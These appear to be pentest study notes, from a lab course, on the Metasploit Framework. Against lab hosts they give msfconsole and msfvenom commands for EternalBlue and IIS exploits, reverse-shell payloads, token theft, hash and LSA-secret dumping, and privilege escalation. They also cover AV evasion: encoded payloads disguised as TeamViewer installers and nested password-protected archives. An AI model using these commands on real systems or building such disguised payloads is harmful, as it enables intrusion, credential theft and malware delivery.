# Metasploit Framework

## 1.Introduction to Metasploit

**Modules**

```shell-session
ls /usr/share/metasploit-framework/modules
```

**Plugins**

```shell-session
ls /usr/share/metasploit-framework/plugins/
```

**Scripts**

```shell-session
ls /usr/share/metasploit-framework/scripts/
```

**Tools**

```shell-session
ls /usr/share/metasploit-framework/tools/
```

## 2.MSFconsole

**Launching MSFconsole**

```shell-session
msfconsole
```

* Alternatively, we can use the `-q` option, which does not display the banner.

```shell-session
 msfconsole -q
```

**Installing MSF**

```shell-session
sudo apt update && sudo apt install metasploit-framework
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FDGHGlOHvCPXm2tPukszB%2Fimage.png?alt=media&amp;token=d5b2ec57-41f3-4176-90f1-37a327cd8f3a" alt=""><figcaption></figcaption></figure>


    ---

# MSF Components: Modules - payloads - encoders - db - plugins - mixin

## 1.Modules

**Syntax**

```shell-session
<No.> <type>/<os>/<service>/<name>
794   exploit/windows/ftp/scriptftp_list
```

**Type**

| **Type**    | **Description**                                                                                 |
| ----------- | ----------------------------------------------------------------------------------------------- |
| `Auxiliary` | Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.  |
| `Encoders`  | Ensure that payloads are intact to their destination.                                           |
| `Exploits`  | Defined as modules that exploit a vulnerability that will allow for the payload delivery.       |
| `NOPs`      | (No Operation code) Keep the payload sizes consistent across exploit attempts.                  |
| `Payloads`  | Code runs remotely and calls back to the attacker machine to establish a connection (or shell). |
| `Plugins`   | Additional scripts can be integrated within an assessment with `msfconsole` and coexist.        |
| `Post`      | Wide array of modules to gather information, pivot deeper, etc.                                 |

### Searching for Modules

```shell-session
msf6 > help search
msf6 > search eternalromance
msf6 > search eternalromance type:exploit
```

**MSF - Specific Search**

```shell-session
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

## Module Selection

```shell-session
nmap -sV 10.10.10.40
```

```shell-session
msf6 > search ms17_010
```

**MSF - Select Module**

```shell-session
msf6 > use 0
```

**MSF - Module Information**

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > info                                    
```

**MSF - Target Specification**

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > options
```

**MSF - Permanent Target Specification**

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40
```

**MSF - LHOST Specification**

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > setg LHOST 10.10.14.15
```

**MSF - Exploit Execution**

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > run
```

```shell-session
meterpreter> shell

C:\Windows\system32> whoami
```

## 2.Targets

**MSF - Show Targets**

```shell-session
msf6 > show targets
```

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > options
```

### Selecting a Target

**MSF - Target Selection**

```shell-session
msf6 exploit(windows/browser/ie_execcommand_uaf) > info
```

```shell-session
msf6 exploit(windows/browser/ie_execcommand_uaf) > options
```

```shell-session
msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets
```

```shell-session
Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7
```

```shell-session
msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 6
```

## 3.Payloads

## Staged Payloads

**MSF - Staged Payloads**

```shell-session
msf6 > show payloads
```

### Searching for Payloads

```shell-session
msf6 > show payloads
```

### **Searching for Specific Payload**

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads
```

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads
```

### Selecting Payloads

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15
```

After selecting a payload, we will have more options available to us.

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
```

### **Execute**

**MSF - Exploit and Payload Configuration**

```shell-session
msf6 exploit(**windows/smb/ms17_010_eternalblue**) > ifconfig
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.15
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

**MSF - Meterpreter Commands**

```shell-session
meterpreter > whoami
meterpreter > getuid
meterpreter > help
```

**MSF - Meterpreter Navigation**

```shell-session
meterpreter > cd Users
meterpreter > ls
meterpreter > shell
```

**MSF - Windows CMD**

```shell-session
C:\Users>dir
C:\Users>whoami
```

### Payload Types

| **Payload**                       | **Description**                                                        |
| --------------------------------- | ---------------------------------------------------------------------- |
| `generic/custom`                  | Generic listener, multi-use                                            |
| `generic/shell_bind_tcp`          | Generic listener, multi-use, normal shell, TCP connection binding      |
| `generic/shell_reverse_tcp`       | Generic listener, multi-use, normal shell, reverse TCP connection      |
| `windows/x64/exec`                | Executes an arbitrary command (Windows x64)                            |
| `windows/x64/loadlibrary`         | Loads an arbitrary x64 library path                                    |
| `windows/x64/messagebox`          | Spawns a dialog via MessageBox using a customizable title, text & icon |
| `windows/x64/shell_reverse_tcp`   | Normal shell, single payload, reverse TCP connection                   |
| `windows/x64/shell/reverse_tcp`   | Normal shell, stager + stage, reverse TCP connection                   |
| `windows/x64/shell/bind_ipv6_tcp` | Normal shell, stager + stage, IPv6 Bind TCP stager                     |
| `windows/x64/meterpreter/$`       | Meterpreter payload + varieties above                                  |
| `windows/x64/powershell/$`        | Interactive PowerShell sessions + varieties above                      |
| `windows/x64/vncinject/$`         | VNC Server (Reflective Injection) + varieties above                    |

***

## 4.Encoders

`Encoders` come into play with the role of changing the payload to run on different operating systems and architectures. These architectures include:

| `x64` | `x86` | `sparc` | `ppc` | `mips` |
| ----- | ----- | ------- | ----- | ------ |

## Selecting an Encoder

```shell-session
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```

### **Generating Payload - Without Encoding**

```shell-session
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```

### Generating Payload - With Encoding

```shell-session
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

**Shikata Ga Nai Encoding**

<figure><img src="https://academy.hackthebox.com/storage/modules/39/shikata_ga_nai.gif" alt=""><figcaption></figcaption></figure>

Source: <https://hatching.io/blog/metasploit-payloads2/>

{% embed url="<https://hatching.io/blog/metasploit-payloads2/>" %}

* Suppose we want to select an Encoder for an `existing payload`. Then, we can use the `show encoders` command within the `msfconsole` to see which encoders are available for our current `Exploit module + Payload` combination.

  <br>

  ```shell-session
  msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15
  msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders
  msf6 exploit(ms09_050_smb2_negotiate_func_index) > show encoders
  ```

```shell-session
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FDR6q6yYpZjk1czQX7orc%2Fimage.png?alt=media&amp;token=7a1e61f9-fe87-40f0-b91f-ffb6939986f4" alt=""><figcaption></figcaption></figure>

* One better option would be to try running it through multiple iterations of the same Encoding scheme:

```shell-session
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
```

**MSF - VirusTotal**

```shell-session
msf-virustotal -k <API key> -f TeamViewerInstall.exe
```

***

## 5.Databases

* `Databases` in `msfconsole` are used to keep track of your results.

## Setting up the Database

**PostgreSQL Status**

```shell-session
sudo service postgresql status
```

**Start PostgreSQL**

```shell-session
sudo systemctl start postgresql
```

**MSF - Initiate a Database**

```shell-session
sudo msfdb init
```

```powershell
# if throw error
apt update
sudo msfdb init
```

```shell-session
sudo msfdb status
sudo msfdb init
```

**MSF - Connect to the Initiated Database**

```shell-session
 sudo msfdb run
```

**MSF - Reinitiate the Database**

```shell-session
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
```

**MSF - Database Options**

```shell-session
msf6 > help database
```

### Using the Database

**Workspaces**

```shell-session
msf6 > workspace
msf6 > workspace -a Target_1
msf6 > workspace
msf6 > workspace -h
```

## Importing Scan Results

**Stored Nmap Scan**

```shell-session
cat Target.nmap

Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 20:54 UTC
Nmap scan report for 10.10.10.40
Host is up (0.017s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Importing Scan Results**

```shell-session
msf6 > db_import Target.xml
```

```shell-session
msf6 > hosts
msf6 > services
```

## Using Nmap Inside MSFconsole

**MSF - Nmap**

```shell-session
msf6 > db_nmap -sV -sS 10.10.10.8
msf6 > services
```

### Data Backup

**MSF - DB Export**

```shell-session
msf6 > db_export -h
```

### Hosts

**MSF - Stored Hosts**

```shell-session
msf6 > hosts -h
```

### Services

**MSF - Stored Services of Hosts**

```shell-session
msf6 > services -h
```

### Credentials

**MSF - Stored Credentials**

```shell-session
msf6 > creds -h
```

### Loot

```shell-session
msf6 > loot -h
```

## 6.Plugins

### Using Plugins

```shell-session
ls /usr/share/metasploit-framework/plugins
```

**MSF - Load Nessus**

```shell-session
msf6 > load nessus
msf6 > nessus_help
```

If the plugin is not installed correctly, we will receive the following error upon trying to load it.

```shell-session
msf6 > load Plugin_That_Does_Not_Exist
```

### Installing new Plugins

```shell-session
git clone https://github.com/darkoperator/Metasploit-Plugins
ls Metasploit-Plugins
```

Here we can take the plugin `pentest.rb` as an example and copy it to `/usr/share/metasploit-framework/plugins`.

**MSF - Copying Plugin to MSF**

```shell-session
sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
```

### **MSF - Load Plugin**

```shell-session
msfconsole -q
msf6 > load pentest
msf6 > help
```

Many people write many different plugins for the Metasploit framework. They all have a specific purpose and can be an excellent help to save time after familiarizing ourselves with them. Check out the list of popular plugins below:

|                                                                                                                     |                                                                                                                                     |                                                                                                                 |
| ------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------- |
| [nMap (pre-installed)](https://nmap.org/)                                                                           | [NexPose (pre-installed)](https://sectools.org/tool/nexpose/)                                                                       | [Nessus (pre-installed)](https://www.tenable.com/products/nessus)                                               |
| [Mimikatz (pre-installed V.1)](http://blog.gentilkiwi.com/mimikatz)                                                 | [Stdapi (pre-installed)](https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Stdapi/Stdapi) | [Railgun](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation) |
| [Priv](https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/priv/priv.rb) | [Incognito (pre-installed)](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/)                                 | [Darkoperator's](https://github.com/darkoperator/Metasploit-Plugins)                                            |

### Mixins

The Metasploit Framework is written in Ruby, an object-oriented programming language. This plays a big part in what makes `msfconsole` excellent to use. Mixins are one of those features that, when implemented, offer a large amount of flexibility to both the creator of the script and the user.

Mixins are classes that act as methods for use by other classes without having to be the parent class of those other classes. Thus, it would be deemed inappropriate to call it inheritance but rather inclusion. They are mainly used when we:

1. Want to provide a lot of optional features for a class.
2. Want to use one particular feature for a multitude of classes.

Most of the Ruby programming language revolves around Mixins as Modules. The concept of Mixins is implemented using the word `include`, to which we pass the name of the module as a `parameter`. We can read more about mixins [here](https://en.wikibooks.org/wiki/Metasploit/UsingMixins).


    ---


# MSF Sessions : session & jobs - Meterpreter

## 1.Sessions

### Using Sessions

**Listing Active Sessions**

```shell-session
msf6 exploit(windows/smb/psexec_psh) > sessions
```

**Interacting with a Session**

```shell-session
msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
```

### Jobs

```shell-session
msf6 exploit(multi/handler) > jobs -h
msf6 exploit(multi/handler) > exploit -h    
```

**Running an Exploit as a Background Job**

```
msf6 exploit(multi/handler) > exploit -j
```

**Listing Running Jobs**

```shell-session
msf6 exploit(multi/handler) > jobs -l
```

## 2. Meterpreter

```shell-session
meterpreter > help
```

### Using Meterpreter

**MSF - Scanning Target**

```shell-session
msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15
msf6 > hosts
msf6 > services
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FKnmILCJhJlzG1RToP3wl%2Fimage.png?alt=media&amp;token=0d388afb-95f3-4a14-aba1-d749e2195245" alt=""><figcaption></figcaption></figure>

**MSF - Searching for Exploit**

```shell-session
msf6 > search iis_webdav_upload_asp
msf6 > use 0
```

**MSF - Configuring Exploit & Payload**

```shell-session
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST tun0
msf6 exploit(windows/iis/iis_webdav_upload_asp) > run
```

**MSF - Meterpreter Migration**

```shell-session
meterpreter > getuid
```

```
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                
 4     0     System                                                          
 216   1080  cidaemon.exe                                                    
 272   4     smss.exe                                                        
 292   1080  cidaemon.exe                                                    
<...SNIP...>

 1712  396   alg.exe                                                         
 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1920  396   dllhost.exe                                                     
 2232  3552  svchost.exe        x86   0                                      C:\WINDOWS\Temp\rad9E519.tmp\svchost.exe
 2312  592   wmiprvse.exe                                                    
 3552  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3624  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 4076  1080  cidaemon.exe                                                    

```

```
meterpreter > steal_token 1836
meterpreter > getuid
```

**MSF - Interacting with the Target**

```cmd-session
c:\Inetpub>dir
c:\Inetpub>cd AdminScripts
```

**MSF - Session Handling**

```shell-session
meterpreter > bg
msf6 exploit(windows/iis/iis_webdav_upload_asp) > use 0
msf6 post(multi/recon/local_exploit_suggester) > show options
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
msf6 post(multi/recon/local_exploit_suggester) > run
```

**MSF - Privilege Escalation**

```shell-session
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_images
```

```shell-session
msf6 exploit(windows/local/ms15_051_client_copy_image) > show options
```

```shell-session
msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1
```

```shell-session
msf6 exploit(windows/local/ms15_051_client_copy_image) > run
```

```shell-session
meterpreter > getuid
```

**MSF - Dumping Hashes**

```shell-session
meterpreter > hashdump
meterpreter > lsa_dump_sam
```

**MSF - Meterpreter LSA Secrets Dump**

```shell-session
meterpreter > lsa_dump_secrets
```





    ---


# Additional Features: MSFVENOM - Writing Exploits

## 1.Writing and Importing Modules

[ExploitDB](https://www.exploit-db.com/) is a great choice when searching for a custom exploit. We can use tags to search through the different exploitation scenarios for each available script.&#x20;

**MSF - Search for Exploits**

```shell-session
msf6 > search nagios
```

```shell-session
searchsploit nagios3
searchsploit -t Nagios3 --exclude=".py"
```

**MSF - Directory Structure**

```shell-session
ls /usr/share/metasploit-framework/
ls .msf4/
```

**MSF - Loading Additional Modules at Runtime**

```shell-session
cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
msfconsole -m /usr/share/metasploit-framework/modules/
```

**MSF - Loading Additional Modules**

```shell-session
msf6> loadpath /usr/share/metasploit-framework/modules/
msf6 > reload_all
msf6 > use exploit/unix/webapp/nagios3_command_injection 
msf6 exploit(unix/webapp/nagios3_command_injection) > show options
```

## Porting Over Scripts into Metasploit Modules

**Porting MSF Modules**

```shell-session
 ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bludit
```

```shell-session
cp ~/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb
```

### Writing Our Module

* details

{% embed url="<https://academy.hackthebox.com/module/39/section/417>" %}

## 2.MSFVenom

### Creating Our Payloads

**Scanning the Target**

```shell-session
nmap -sV -T4 -p- 10.10.10.5
```

**FTP Anonymous Access**

```shell-session
ftp 10.10.10.5

Name (10.10.10.5:root): anonymous
```

\
**Generating Payload**

```shell-session
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```

**MSF - Setting Up Multi/Handler**

```shell-session
msfconsole -q 
msf6 > use multi/handler
msf6 exploit(multi/handler) > show options
msf6 exploit(multi/handler) > set LHOST 10.10.14.5
msf6 exploit(multi/handler) > set LPORT 1337
msf6 exploit(multi/handler) > run
```

### Executing the Payload

Now we can trigger the `.aspx` payload on the web service

```
http://10.10.10.5/reverse_shell.aspx
```

```shell-session
meterpreter > getuid
```

### Local Exploit Suggester

```shell-session
msf6 > search local exploit suggester
msf6 exploit(multi/handler) > use 2376
msf6 post(multi/recon/local_exploit_suggester) > show options
msf6 post(multi/recon/local_exploit_suggester) > set session 2
msf6 post(multi/recon/local_exploit_suggester) > run

```

The second option, `ms10_015_kitrap0d`, does the trick.

### **MSF - Local Privilege Escalation**

```shell-session
msf6 exploit(multi/handler) > search kitrap0d
msf6 exploit(multi/handler) > use 0
msf6 exploit(windows/local/ms10_015_kitrap0d) > show options
msf6 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 1338
msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 3
msf6 exploit(windows/local/ms10_015_kitrap0d) > run
meterpreter > getuid
```

* we Server username: NT AUTHORITY\SYSTEM

## 2.Firewall and IDS/IPS Evasion

### Evasion Techniques

```shell-session
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```

* we will get

```shell-session
TeamViewer_Setup.exe
```

### Archives

```shell-session
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
```

```shell-session
cat test.js
msf-virustotal -k <API key> -f test.js 

```

* Now, try archiving it two times, passwording both archives upon creation, and removing the `.rar`/`.zip`/`.7z` extension from their names. For this purpose, we can install the [RAR utility](https://www.rarlab.com/download.htm) from RARLabs, which works precisely like WinRAR on Windows.

**Archiving the Payload**

```shell-session
wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
tar -xzvf rarlinux-x64-612.tar.gz && cd rar
rar a ~/test.rar -p ~/test.js
```

```shell-session
ls

test.js   test.rar
```

**Removing the .RAR Extension**

```shell-session
mv test.rar test
ls

test   test.js
```

**Archiving the Payload Again**

```shell-session
rar a test2.rar -p test
```

**Removing the .RAR Extension**

```shell-session
 mv test2.rar test2
 
 ls

test   test2   test.js
```

**VirusTotal**

```shell-session
 msf-virustotal -k <API key> -f test2
```

## Packers

The term `Packer` refers to the result of an `executable compression` process where the payload is packed together with an executable program and with the decompression code in one single file.

A list of popular packer software:

|                                      |                                                      |                                                                                         |
| ------------------------------------ | ---------------------------------------------------- | --------------------------------------------------------------------------------------- |
| [UPX packer](https://upx.github.io/) | [The Enigma Protector](https://enigmaprotector.com/) | [MPRESS](https://web.archive.org/web/20240310213323/https://www.matcode.com/mpress.htm) |
| Alternate EXE Packer                 | ExeStealth                                           | Morphine                                                                                |
| MEW                                  | Themida                                              |                                                                                         |

If we want to learn more about packers, please check out the [PolyPack project](https://jon.oberheide.org/files/woot09-polypack.pdf).

### Exploit Coding

```ruby
'Targets' =>
[
 	[ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
],
```
